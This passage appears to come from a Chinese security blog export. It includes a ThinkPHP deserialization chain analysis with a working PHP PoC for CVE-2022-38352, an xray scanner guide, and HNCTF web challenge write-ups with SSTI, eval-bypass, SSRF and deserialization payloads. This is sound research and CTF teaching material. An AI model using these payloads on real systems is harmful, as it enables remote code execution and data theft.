        $where     = $this-&gt;getWhere();

        $result = $db-&gt;where($where)
            -&gt;strict(false)
            -&gt;cache(true)
            -&gt;setOption(&#x27;key&#x27;, $this-&gt;key)
            -&gt;field($allowFields)
            -&gt;update($data);

        $this-&gt;checkResult($result);

        // 关联更新
        if (!empty($this-&gt;relationWrite)) &#123;
            $this-&gt;autoRelationUpdate();
        &#125;
    &#125;);

    // 更新回调
    $this-&gt;trigger(&#x27;AfterUpdate&#x27;);

    return true;
&#125;</code></pre>
<p>这里首先trigger可控，又checkdata方法又没定义，都可以跳过</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240856931.png?x-oss-process=hzy" alt="image-20221024085632858"></p>
<p>直接跟进getChangeData方法</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240857830.png?x-oss-process=hzy" alt="image-20221024085709754"></p>
<p>$this-&gt;force可控，为true时就会返回$this-&gt;data，所以也就是$data=$this-&gt;data</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240901602.png?x-oss-process=hzy" alt="image-20221024090149531"></p>
<p>这里我们想进入到checkAllowFields方法需要让上面的if语句不成立</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240903509.png?x-oss-process=hzy" alt="image-20221024090359381"></p>
<p>简单来说也就是让$data是否为空，这里若为空，就可以不进入if语句，执行到checkAllowFields()</p>
<p>继续跟进到checkAllowFields()</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240905976.png?x-oss-process=hzy" alt="image-20221024090524878"></p>
<p>这里刚开始的两个变量field和schema都是可控变量，构造为空时就可以进入db方法</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240907710.png?x-oss-process=hzy" alt="image-20221024090714634"></p>
<p>不难发现这里就会触发_tostring魔法函数，这里的点起到了字符串拼接作用</p>
<p>综上这一部分的pop链子就是这样的</p>
<pre><code class="hljs plaintext">__destruct()——&gt;save()——&gt;updateData()——&gt;checkAllowFields()——&gt;db()——&gt;$this-&gt;table . $this-&gt;suffix（字符串拼接）——&gt;toString()


$this-&gt;exists = true;
$this-&gt;$withEvent = false;
$this-&gt;$lazySave = true;</code></pre>
<p>然后后面就是之前的老链子了，tp5的链子</p>
<p>出发点是这个</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240912197.png?x-oss-process=hzy" alt="image-20221024091215116"></p>
<p>跟进toJson方法</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240912795.png?x-oss-process=hzy" alt="image-20221024091242743"></p>
<p>继续跟进toArray方法</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240913643.png?x-oss-process=hzy" alt="image-20221024091310560"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240913939.png?x-oss-process=hzy" alt="image-20221024091347858"></p>
<p>在下面这里这个关键函数</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240915851.png?x-oss-process=hzy" alt="image-20221024091510752"></p>
<p>触发他的条件是</p>
<pre><code class="hljs plaintext">this−&gt;visible[key]存在，即this-&gt;visible存在键名为key的键，而k e y 则 来 源 于 data的键名，data则来源于this-&gt;data，也就是说this−&gt;data和this-&gt;visible要有相同的键名$key</code></pre>
<p>继续跟进getAttr方法，在这里不难发现，这个地方对于$this-&gt;pool-&gt;getItem($this-&gt;key);调用的同时也触发了__call魔法函数</p>
<p>这个getltem方法在Cgabbel对象中又不存在，所以调用之前会先构造</p>
<blockquote>
<p>__call () 用于<strong>当调用一个对象存在的方法时自动调用</strong>。</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291744161.png?x-oss-process=hzy" alt="image-20220929174443097"></p>
<p>__call函数调用了log函数之后又去调用record函数</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291751851.png?x-oss-process=hzy" alt="image-20220929175149787"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291753462.png?x-oss-process=hzy" alt="image-20220929175325385"></p>
<p>继续跟进record函数，继续跟进save函数</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291754640.png?x-oss-process=hzy" alt="image-20220929175451565"></p>
<p>继续调用save函数</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291756893.png?x-oss-process=hzy" alt="image-20220929175617821"></p>
<p>跟进去</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291807760.png?x-oss-process=hzy" alt="image-20220929180741660"></p>
<p>这个request类中url会进行解析</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291811169.png?x-oss-process=hzy" alt="image-20220929181132100"></p>
<p>跟进invoke函数</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291812279.png?x-oss-process=hzy" alt="image-20220929181247208"></p>
<p>跟进invokeMethod</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291813136.png?x-oss-process=hzy" alt="image-20220929181355062"></p>
<p>至此链子已经很清晰了，现在构建反序列化入口</p>
<blockquote>
<p>需要编写一个控制器模块并存在反序列化可控点得以利用此链条</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240827393.png?x-oss-process=hzy" alt="image-20221024082721287"></p>
<p>访问该路由，传参测试</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240827252.png?x-oss-process=hzy" alt="image-20221024082751179"></p>
<p>入口点构造成功，下面开始写入poc</p>
<p>最后回到eval函数即可执行RCE</p>
<p>poc如下</p>
<pre><code class="hljs plaintext">&lt;?php

namespace League\Flysystem\Cached\Storage&#123;

    class Psr6Cache&#123;
        private $pool;
        protected $autosave = false;
        public function __construct($exp)
        &#123;
            $this-&gt;pool = $exp;
        &#125;
    &#125;
&#125;

namespace think\log&#123;
    class Channel&#123;
        protected $logger;
        protected $lazy = true;

        public function __construct($exp)
        &#123;
            $this-&gt;logger = $exp; 
            $this-&gt;lazy = false;
        &#125;
    &#125;
&#125;

namespace think&#123;
    class Request&#123;
        protected $url;
        public function __construct()
        &#123;
            $this-&gt;url = &#x27;&lt;?php system(\&#x27;calc\&#x27;); exit(); ?&gt;&#x27;;
        &#125;
    &#125;
    class App&#123;
        protected $instances = [];
        public function __construct()
        &#123;
            $this-&gt;instances = [&#x27;think\Request&#x27;=&gt;new Request()];
        &#125;
    &#125;
&#125;

namespace think\view\driver&#123;
    class Php&#123;&#125;
&#125;

namespace think\log\driver&#123;

    class Socket&#123;
        protected $config = [];
        protected $app;
        protected $clientArg = [];

        public function __construct()
        &#123;
            
            $this-&gt;config = [
                &#x27;debug&#x27;=&gt;true,
                &#x27;force_client_ids&#x27; =&gt; 1,
                &#x27;allow_client_ids&#x27; =&gt; &#x27;&#x27;,
                &#x27;format_head&#x27; =&gt; [new \think\view\driver\Php,&#x27;display&#x27;], # 利用类和方法
            ];
            $this-&gt;app = new \think\App();
            $this-&gt;clientArg = [&#x27;tabid&#x27;=&gt;&#x27;1&#x27;];
        &#125;
    &#125;
&#125;

namespace&#123;
    $c = new think\log\driver\Socket();
    $b = new think\log\Channel($c);
    $a = new League\Flysystem\Cached\Storage\Psr6Cache($b);
    echo urlencode(serialize($a));
&#125;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291819220.png?x-oss-process=hzy" alt="image-20220929181920152"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240829084.png?x-oss-process=hzy" alt="image-20221024082945940"></p>
<h1 id="后言">后言</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291820117.png?x-oss-process=hzy" alt="image-20220929182059025"></p>
<p>已提交CVE，编号CVE-2022-38352</p>
<p><a href="https://github.com/top-think/framework/issues/2749">https://github.com/top-think/framework/issues/2749</a></p>
<p>浅浅总结一下，找洞的秘诀是细心！耐心！</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>xray扫描器</title>
    <url>/2022/04/14/xray%E6%89%AB%E6%8F%8F%E5%99%A8/</url>
    <content><![CDATA[<h3 id="xray扫描器">xray扫描器</h3>
<span id="more"></span>
<p>xray是一种功能强大的扫描工具。xray 社区版是长亭科技推出的免费白帽子工具平台，目前社区有 xray <a href="https://so.csdn.net/so/search?q=%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F&amp;spm=1001.2101.3001.7020">漏洞扫描</a>器和 Radium 爬虫工具，由多名经验丰富的安全开发者和数万名社区贡献者共同打造而成。</p>
<h3 id="下载地址">下载地址</h3>
<p>https://<a href="https://so.csdn.net/so/search?q=github&amp;spm=1001.2101.3001.7020">github</a>.com/chaitin/xray/releases</p>
<h2 id="版本选择">版本选择</h2>
<p><img src="http://img.hzy2003628.top/1a2c05da7f1e1933a5ee99179f24d98c.png" alt="img"></p>
<ul>
<li><code>darwin_amd64</code> 苹果系统</li>
<li><code>linux_386</code> Linux x86</li>
<li><code>linux_amd64</code> Linux x64</li>
<li><code>windows_386</code> Windows x86</li>
<li><code>windows_amd64</code> Windows x64</li>
<li><code>sha256.txt</code> 校正文件，内含个版本的sha256的哈希值，请下载后自行校正以防被劫持投毒。</li>
<li><code>Source Code</code> 为Github自动打包的，无意义，请忽略。</li>
</ul>
<h3 id="基本使用">基本使用</h3>
<p>下载对应系统的版本后，解压缩zip文件，Linux / Mac用户在终端（终端）运行，Windows用户请在Powershell或其他高级Shell中运行，在CMD中运行可能体验不佳。</p>
<ul>
<li>
<p>使用基础<a href="https://so.csdn.net/so/search?q=%E7%88%AC%E8%99%AB&amp;spm=1001.2101.3001.7020">爬虫</a>爬取并对爬虫爬取的链接进行漏洞扫描：</p>
<pre><code class="hljs javascript">xray webscan --basic-crawler <span class="hljs-attr">http</span>:<span class="hljs-comment">//example.com --html-output xxx.html</span></code></pre>
</li>
<li>
<p>使用 HTTP 代理进行被动扫描：</p>
<p>设置浏览器 http 代理为http://127.0.0.1:7777，然后使用浏览器访问网页，就可以自动分析代理流量并扫描。</p>
<pre><code class="hljs css">xray webscan <span class="hljs-attr">--listen</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">7777</span> --html-output xxx.html</code></pre>
</li>
<li>
<p>快速测试单个 url, 无爬虫：</p>
<pre><code class="hljs ruby">xray webscan --url <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/example.com/</span><span class="hljs-string">?a</span>=b --html-output single-url.html</code></pre>
</li>
<li>
<p>手动指定本次运行的插件：</p>
<p>默认情况下，将会启用所有内置插件，可以使用下列命令指定本次扫描启用的插件。</p>
<pre><code class="hljs css">xray webscan <span class="hljs-attr">--plugins</span> cmd_injection,sqldet <span class="hljs-attr">--url</span> http://example.comxray webscan --plugins cmd_injection,sqldet --listen <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">7777</span></code></pre>
</li>
<li>
<p>生成 ca 证书：</p>
<pre><code class="hljs undefined">.\xray_windows_amd64.exe genca</code></pre>
</li>
</ul>
<h3 id="与burp联动使用">与burp联动使用</h3>
<p><strong>转自</strong>：</p>
<p>d<br>
.\xray_windows_amd64.exe genca</p>
<pre><code>
### 与burp联动使用

**转自**：

https://blog.csdn.net/qq_32393893/article/details/109471385
</code></pre>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>不蒜子与看板娘的矛盾</title>
    <url>/2022/01/19/%E4%B8%8D%E8%92%9C%E5%AD%90%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>不蒜子统计相关问题</p>
<span id="more"></span>
<p>不蒜子统计访客量总是不显示，这个问题我差了很多资料，希望可以帮到大家！NexT 预置了不蒜子提供的网页计数功能。只需要在配置文件中启用即可！</p>
<p>至于为啥总是不显示数据，初步发现应该和看板娘Live2D冲突导致的！</p>
<h1 id="导致原因">导致原因</h1>
<p>添加 Live2D 后网页的不蒜子部分源码的 <code>style</code> 从 <code>&quot;display: inline;&quot;</code> 替换为了 <code>&quot;display: none;&quot;</code></p>
<h1 id="解决方法">解决方法</h1>
<p>将流量统计相关代码的外层<code>&lt;span&gt;</code>删除即可正常显示，如图：</p>
<h1 id="原来代码">原来代码：<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/cd71f3edc1d8a635a31b7b370b1ddd5e.png?x-oss-process=hzy" alt="image-20220203205412286"></h1>
<p>修改之后：</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/207338329acdaf14070c8aee46609342.png?x-oss-process=hzy" alt="image-20220203205452405"></p>
]]></content>
      <categories>
        <category>博客相关问题类</category>
      </categories>
      <tags>
        <tag>不蒜子不显示</tag>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>HNCTF</title>
    <url>/2022/11/02/%7FHNCTF/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021920470.png?x-oss-process=hzy" alt="img"></p>
<span id="more"></span>
<hr>
<h1 id="web">WEB</h1>
<h2 id="week1easy_html">[Week1]easy_html</h2>
<p>COOKIE有路径，访问得到一个页面</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021515690.png?x-oss-process=hzy" alt="image-20221002151506296"></p>
<p>但是发现只能输进去十位，bp抓包随便十一位得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021516282.png?x-oss-process=hzy" alt="image-20221002151657202"></p>
<p>NSSCTF{2f68a13b-427c-42ab-9c3a-ca7f7caa0361}</p>
<h2 id="week1interesting_include">[Week1]Interesting_include</h2>
<p>题目如下</p>
<pre><code class="hljs plaintext">&lt;?php
//WEB手要懂得搜索
//flag in ./flag.php

if(isset($_GET[&#x27;filter&#x27;]))&#123;
    $file = $_GET[&#x27;filter&#x27;];
    if(!preg_match(&quot;/flag/i&quot;, $file))&#123;
        die(&quot;error&quot;);
    &#125;
    include($file);
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>
<p>文件包含，直接base64读文件即可</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021521388.png?x-oss-process=hzy" alt="image-20221002152156289"></p>
<blockquote>
<p><strong>php://filter</strong>可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。</p>
</blockquote>
<pre><code class="hljs plaintext">&lt;?php

$flag = &#x27;flag=NSSCTF&#123;c7f78e2c-ae99-4e41-af41-926dcad08a16&#125;&#x27;;
?&gt;</code></pre>
<h2 id="week1interesting_http">[Week1]Interesting_http</h2>
<p>首先是post传参</p>
<p>然后want=flag需要admin验证，改cookie</p>
<p>然后是本地验证，加xff</p>
<p>NSSCTF{3caa079f-e3c5-4198-a26e-72c82617dea0}</p>
<h2 id="week12048">[Week1]2048</h2>
<p>游戏题，考察js泄露</p>
<p>直接找就找到flag了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021533029.png?x-oss-process=hzy" alt="image-20221002153355965"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021534232.png?x-oss-process=hzy" alt="image-20221002153406159"></p>
<p>NSSCTF{53160c888e25c3f828b23e316a7ae083}</p>
<h2 id="week1easy_upload">[Week1]easy_upload</h2>
<p>直接上传个马</p>
<p>NSSCTF{95a44373-0b8f-4f8e-9a8f-29b807bb9e4d}</p>
<h2 id="week1what-is-web">[Week1]What is Web</h2>
<p>扫目录发现/flag.php，没个卵用，抓包得到flag，就在源码里</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021617585.png?x-oss-process=hzy" alt="image-20221002161713521"></p>
<p>NSSCTF{Hell0_Weber_Wec0m3_come_2_web_w0r1d!}</p>
<h2 id="week2ez_ssti">[WEEK2]ez_SSTI</h2>
<p>基础ssti</p>
<pre><code class="hljs plaintext">&#123;&#123;%20config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20flag%27).read()%20&#125;&#125;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061704173.png?x-oss-process=hzy" alt="image-20221006170429096"></p>
<p>NSSCTF{1d65a989-f8e6-4bcb-8172-bf47a66e9010}</p>
<h2 id="week2easy_include">[WEEK2]easy_include</h2>
<p>题目如下</p>
<pre><code class="hljs plaintext">&lt;?php
//WEB手要懂得搜索

if(isset($_GET[&#x27;file&#x27;]))&#123;
    $file = $_GET[&#x27;file&#x27;];
    if(preg_match(&quot;/php|flag|data|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=/i&quot;, $file))&#123;
        die(&quot;error&quot;);
    &#125;
    include($file);
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061743143.png?x-oss-process=hzy" alt="image-20221006174334071"></p>
<p>可以访问代表可以访问内网文件，访问日志文件</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061744359.png?x-oss-process=hzy" alt="image-20221006174457273"></p>
<p>基本思路就出来了，包含nginx日志，UA写🐎即可</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061748739.png?x-oss-process=hzy" alt="image-20221006174836674"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061748683.png?x-oss-process=hzy" alt="image-20221006174845623"></p>
<p>NSSCTF{f91ead3d-322d-408c-944f-7726371b69b1}</p>
<h2 id="week2canyource">[WEEK2]Canyource</h2>
<p>题目如下</p>
<pre><code class="hljs plaintext">&lt;?php
highlight_file(__FILE__);
if(isset($_GET[&#x27;code&#x27;])&amp;&amp;!preg_match(&#x27;/url|show|high|na|info|dec|oct|pi|log|data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;code&#x27;]))&#123;
if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123;    
    eval($_GET[&#x27;code&#x27;]);&#125;
else
    die(&#x27;nonono&#x27;);&#125;
else
    echo(&#x27;please input code&#x27;);
?&gt;  please input code</code></pre>
<p>就是绕过过滤执行eval函数</p>
<pre><code class="hljs plaintext">?code=eval(end(current(get_defined_vars())));&amp;a=system(&#x27;ls;pwd&#x27;);</code></pre>
<p>然后cat，tac，nl，tail都被过滤了，读不了flag</p>
<p>用base64可读</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091729830.png?x-oss-process=hzy" alt="image-20221009172908730"></p>
<pre><code class="hljs plaintext">Are you kinding me?&lt;?php $flag=&quot;NSSCTF&#123;d31fe1bf-39c6-46b5-a197-4f1ff6ddc1ad&#125;&quot;</code></pre>
<p>NSSCTF{d31fe1bf-39c6-46b5-a197-4f1ff6ddc1ad}</p>
<h2 id="week2ez_ssrf">[WEEK2]ez_ssrf</h2>
<p>主要代码如下</p>
<pre><code class="hljs plaintext">&lt;?php

highlight_file(__FILE__);
error_reporting(0);

$data=base64_decode($_GET[&#x27;data&#x27;]);
$host=$_GET[&#x27;host&#x27;];
$port=$_GET[&#x27;port&#x27;];

$fp=fsockopen($host,intval($port),$error,$errstr,30);
if(!$fp) &#123;
    die();
&#125;
else &#123;
    fwrite($fp,$data);
    while(!feof($data))
    &#123;
        echo fgets($fp,128);
    &#125;
    fclose($fp);
&#125;</code></pre>
<h2 id="week1challenge__rce复现">[Week1]Challenge__rce(复现)</h2>
<blockquote>
<p>hint:灵感来源于ctfshow吃瓜杯Y4大佬的题</p>
</blockquote>
<pre><code class="hljs plaintext">?hint</code></pre>
<pre><code class="hljs plaintext">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot;/&gt;
    &lt;title&gt;Challenge_rce&lt;/title&gt;
    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;./css/index.css&quot;/&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;!--?hint--&gt;

&lt;/body&gt;
&lt;/html&gt;


&lt;?php
error_reporting(0);
if (isset($_GET[&#x27;hint&#x27;])) &#123;
    highlight_file(__FILE__);
&#125;
if (isset($_POST[&#x27;rce&#x27;])) &#123;
    $rce = $_POST[&#x27;rce&#x27;];
    if (strlen($rce) &lt;= 120) &#123;
        if (is_string($rce)) &#123;
            if (!preg_match(&quot;/[!@#%^&amp;*:&#x27;\-&lt;?&gt;\&quot;\/|`a-zA-Z~\\\\]/&quot;, $rce)) &#123;
                eval($rce);
            &#125; else &#123;
                echo(&quot;Are you hack me?&quot;);
            &#125;
        &#125; else &#123;
            echo &quot;I want string!&quot;;
        &#125;
    &#125; else &#123;
        echo &quot;too long!&quot;;
    &#125;
&#125;</code></pre>
<p>题目源码给了</p>
<p>是吃瓜杯的题目Shellme_Revenge的一小部分</p>
<p>测试一下可用符号</p>
<pre><code class="hljs plaintext">&lt;?php
for($a = 0; $a &lt; 256; $a++)&#123;
    if (!preg_match(&quot;/[!@#%^&amp;*:&#x27;\-&lt;?&gt;\&quot;\/|`a-zA-Z~\\\\]/&quot;, chr($a)))&#123;
        echo chr($a).&quot; &quot;;
    &#125;
&#125;
?&gt;
</code></pre>
<p>可用符号还有</p>
<pre><code class="hljs plaintext">$ ( ) + , . 0 1 2 3 4 5 6 7 8 9 ; = [ ] _ &#123; &#125;</code></pre>
<p>无参rce，无疑了，到这里思路就断了，后来看佬的wp发现是使用自增rce，这里引用佬的一段解释吧</p>
<pre><code class="hljs plaintext">$_=[]._;$__=$_[1];$_=$_[0];$_++;$_1=++$_;$_++;$_++;$_++;$_++;$_=$_1.++$_.$__;$_=_.$_(71).$_(69).$_(84);$$_[1]($$_[2]);


GET
?1=system&amp;2=ls

POST
rce=%24_%3D%5B%5D._%3B%24__%3D%24_%5B1%5D%3B%24_%3D%24_%5B0%5D%3B%24_%2B%2B%3B%24_1%3D%2B%2B%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24_1.%2B%2B%24_.%24__%3B%24_%3D_.%24_(71).%24_(69).%24_(84)%3B%24%24_%5B1%5D(%24%24_%5B2%5D)%3B
</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211011656964.png?x-oss-process=hzy" alt="image-20221101165621404"></p>
<p>NSSCTF{02fdf7f1-a59e-4c6b-84ff-1bfc039671c5}</p>
<h2 id="week2ez_ssrf复现">[WEEK2]ez_ssrf(复现)</h2>
<blockquote>
<p>访问/index.php</p>
</blockquote>
<p>题目名字就很明确是ssrf了，但是当时直接摆烂了</p>
<pre><code class="hljs plaintext">&lt;?php

highlight_file(__FILE__);
error_reporting(0);

$data=base64_decode($_GET[&#x27;data&#x27;]);
$host=$_GET[&#x27;host&#x27;];
$port=$_GET[&#x27;port&#x27;];

$fp=fsockopen($host,intval($port),$error,$errstr,30);  // 传过去需要等待三十秒
if(!$fp) &#123;
    die();
&#125;
else &#123;
    fwrite($fp,$data);
    while(!feof($data))
    &#123;
        echo fgets($fp,128);
    &#125;
    fclose($fp);
&#125;</code></pre>
<p>socket伪造http请求ssrf</p>
<pre><code class="hljs plaintext">GET /flag.php HTTP/1.1
Host: 43.143.195.203
Connection: Close
base64编码
R0VUIC9mbGFnLnBocCBIVFRQLzEuMQpIb3N0OiA0My4xNDMuMTk1LjIwMwpDb25uZWN0aW9uOiBDbG9zZQ==</code></pre>
<pre><code class="hljs plaintext">?data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQpIb3N0OiA0My4xNDMuMTk1LjIwMwpDb25uZWN0aW9uOiBDbG9zZQ==&amp;host=43.143.195.203&amp;port=5000</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211011703301.png?x-oss-process=hzy" alt="image-20221101170347213"></p>
<p>发现带不出来，那就试试题目ip</p>
<pre><code class="hljs plaintext">R0VUIC9mbGFnLnBocCBIVFRQLzEuMQpIb3N0OiA0My4xNDMuNy45NwpDb25uZWN0aW9uOiBDbG9zZQ==</code></pre>
<pre><code class="hljs plaintext">?data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQpIb3N0OiA0My4xNDMuMTk1LjIwMwpDb25uZWN0aW9uOiBDbG9zZQ==&amp;host=43.143.7.97&amp;port=5000</code></pre>
<p>题目ip也不行需要是127的</p>
<pre><code class="hljs plaintext">GET /flag.php HTTP/1.1
Host: 127.0.0.1
Connection: Close

R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo=</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211011709214.png?x-oss-process=hzy" alt="image-20221101170907033"></p>
<p>nssctf{095948b9b2be-8444-3750-99ba94d3b4f5}</p>
<h2 id="week2easy_unser复现">[WEEK2]easy_unser(复现)</h2>
<p>题目如下</p>
<pre><code class="hljs plaintext">&lt;?php 
    include &#x27;f14g.php&#x27;;
    error_reporting(0);

    highlight_file(__FILE__);

    class body&#123;

    private $want,$todonothing = &quot;i can&#x27;t get you want,But you can tell me before I wake up and change my mind&quot;;

    public function  __construct($want)&#123;
        $About_me = &quot;When the object is created,I will be called&quot;;
        if($want !== &quot; &quot;) $this-&gt;want = $want;
        else $this-&gt;want = $this-&gt;todonothing;
    &#125;
    function __wakeup()&#123;
        $About_me = &quot;When the object is unserialized,I will be called&quot;;
        $but = &quot;I can CHANGE you&quot;;
        $this-&gt; want = $but;
        echo &quot;C1ybaby!&quot;;
        
    &#125;
    function __destruct()&#123;
        $About_me = &quot;I&#x27;m the final function,when the object is destroyed,I will be called&quot;;
        echo &quot;So,let me see if you can get what you want\n&quot;;
        if($this-&gt;todonothing === $this-&gt;want)
            die(&quot;鲍勃,别傻愣着!\n&quot;);
        if($this-&gt;want == &quot;I can CHANGE you&quot;)
            die(&quot;You are not you....&quot;);
        if($this-&gt;want == &quot;f14g.php&quot; OR is_file($this-&gt;want))&#123;
            die(&quot;You want my heart?No way!\n&quot;);
        &#125;else&#123;
            echo &quot;You got it!&quot;;
            highlight_file($this-&gt;want);
            &#125;
    &#125;
&#125;

    class unserializeorder&#123;
        public $CORE = &quot;人类最大的敌人,就是无序. Yahi param vaastavikta hai!&lt;BR&gt;&quot;;
        function __sleep()&#123;
            $About_me = &quot;When the object is serialized,I will be called&quot;;
            echo &quot;We Come To HNCTF,Enjoy the ser14l1zti0n &lt;BR&gt;&quot;;
        &#125;
        function __toString()&#123;
            $About_me = &quot;When the object is used as a string,I will be called&quot;;
            return $this-&gt;CORE;
        &#125;
    &#125;
    
    $obj = new unserializeorder();
    echo $obj;
    $obj = serialize($obj);
    

    if (isset($_GET[&#x27;ywant&#x27;]))
    &#123;
        $ywant = @unserialize(@$_GET[&#x27;ywant&#x27;]);
        echo $ywant;
    &#125;
?&gt;
人类最大的敌人,就是无序. Yahi param vaastavikta hai!
We Come To HNCTF,Enjoy the ser14l1zti0n</code></pre>
<p>考察php反序列化</p>
<p>目标就是这里</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211011718462.png?x-oss-process=hzy" alt="image-20221101171824388"></p>
<p>传入的变量需要new一个新的body类</p>
<p>并且不能触发wakeup魔法函数，这个地方容易绕过.类中传入参数数量大于实际参数数量即可</p>
<p>其次还需要绕过这个条件</p>
<pre><code class="hljs plaintext">if($this-&gt;want == &quot;f14g.php&quot; OR is_file($this-&gt;want))</code></pre>
<blockquote>
<p>1.伪协议ls_file检测是除了file外的伪协议都是false</p>
<p>2.使用假目录  ./false/…f14g.php</p>
</blockquote>
<pre><code class="hljs plaintext">&lt;?php 

    class body&#123;

    private $want,$todonothing = &quot;i can&#x27;t get you want,But you can tell me before I wake up and change my mind&quot;;

    public function  __construct($want)&#123;
        //$this-&gt;want = &quot;php://filter/convert.base64-encode/resource=f14g.php&quot;;
        $this -&gt;want = &quot;./a/../f14g.php&quot;;
        $this -&gt;todonothing = &quot;22&quot;;
    &#125;
&#125;
$huang = new body();

echo(urlencode(serialize($huang)));
    

?&gt;
//O%3A4%3A%22body%22%3A2%3A%7Bs%3A10%3A%22%00body%00want%22%3Bs%3A15%3A%22.%2Fa%2F..%2Ff14g.php%22%3Bs%3A17%3A%22%00body%00todonothing%22%3Bs%3A2%3A%2222%22%3B%7D
O:4:&quot;body&quot;:2:&#123;s:10:&quot;bodywant&quot;;s:15:&quot;./a/../f14g.php&quot;;s:17:&quot;bodytodonothing&quot;;s:2:&quot;22&quot;;&#125;
O:4:&quot;body&quot;:3:&#123;s:10:&quot;bodywant&quot;;s:15:&quot;./a/../f14g.php&quot;;s:17:&quot;bodytodonothing&quot;;s:2:&quot;22&quot;;&#125;
</code></pre>
